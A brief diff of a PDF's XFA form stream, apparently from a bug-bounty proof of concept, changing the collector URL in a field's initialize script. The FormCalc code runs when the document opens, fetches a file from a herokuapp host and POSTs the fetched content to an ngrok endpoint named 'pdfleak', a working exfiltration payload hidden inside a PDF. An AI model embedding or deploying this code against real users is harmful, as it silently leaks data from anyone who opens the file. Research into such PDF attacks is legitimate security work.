@@ -19,7 +19,7 @@ stream
             <event activity="initialize">
                 <script contentType='application/x-formcalc'>
                     var content = GET("https://bughunt1307.herokuapp.com/xss.js")
-                    POST("https://44e29ba2.ngrok.io/pdfleak",content)
+                    POST("https://02891005.ngrok.io/pdfleak",content)
                 </script>
             </event>
         </field>
